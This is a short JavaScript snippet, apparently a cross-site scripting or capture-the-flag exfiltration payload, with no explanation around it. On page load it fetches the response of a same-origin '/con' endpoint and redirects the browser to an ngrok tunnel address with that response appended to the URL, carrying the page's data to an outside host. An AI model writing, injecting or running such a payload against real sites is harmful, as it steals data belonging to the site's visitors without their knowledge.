addEventListener("load", function(e){
    fetch("/con", {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
        },
        body: JSON.stringify({})
    }).then(function(res){
        res.text().then(function(str){
            window.location.href="https://ce0e-106-178-156-166.ngrok-free.app/cnt/res.html#" + str;
        })
    });
});
